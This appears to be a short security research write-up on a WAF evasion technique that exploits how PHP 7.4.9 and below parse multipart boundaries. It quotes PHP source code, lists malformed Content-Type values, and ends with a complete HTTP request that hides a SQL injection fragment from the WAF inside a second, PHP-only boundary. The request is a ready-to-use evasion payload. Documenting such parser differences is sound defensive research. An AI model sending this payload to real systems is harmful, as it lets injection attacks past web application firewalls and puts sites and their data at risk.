### PHP 7.4.9 and below

**Incorrect boundary parsing**  
Attack payload can be hidden from WAF in file

**Source code**  
[/php/php-src/main/rfc1867.c](https://github.com/php/php-src/blob/4514afc1875bedf4dc07cb457f8ef5c986a7ca55/main/rfc1867.c#L711-L725)
```c
boundary = strstr(content_type_dup, "boundary");
...
if (!boundary || !(boundary = strchr(boundary, '='))) {
```

[/php/php-src/main/SAPI.c](https://github.com/php/php-src/blob/af80d8a14e5540a151e2b40f165ebe122467484b/main/SAPI.c#L182-L195)
```c
for (p=content_type; p<content_type+content_type_length; p++) {
  switch (*p) {
    case ';':
    case ',':
    case ' ':
      content_type_length = p-content_type;
      ...
    default:
      *p = tolower(*p);
```

**Content-Type**
```
application/x-www-form-urlencoded XXX
application/x-www-form-urlencoded,XXX
multipart/form-data XXX
multipart/form-data,XXX
```

**Multipart Content-Type**
| Check             | Value            |
|-------------------|------------------|
| Mime-Type         | case-insensitive |
| Multiple boundary | first position   |
| Boundary key      | case-sensitive   |

**HTTP Request**
```http
POST / HTTP/1.1
Host: localhost
Content-Type: multipart/form-data XXX; PHPboundaryPHP=phpboundary; boundary=wafboundary
Content-Length: 219

--wafboundary
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

--phpboundary
Content-Disposition: form-data; name="q"

' union select '1
--phpboundary--
--wafboundary--
```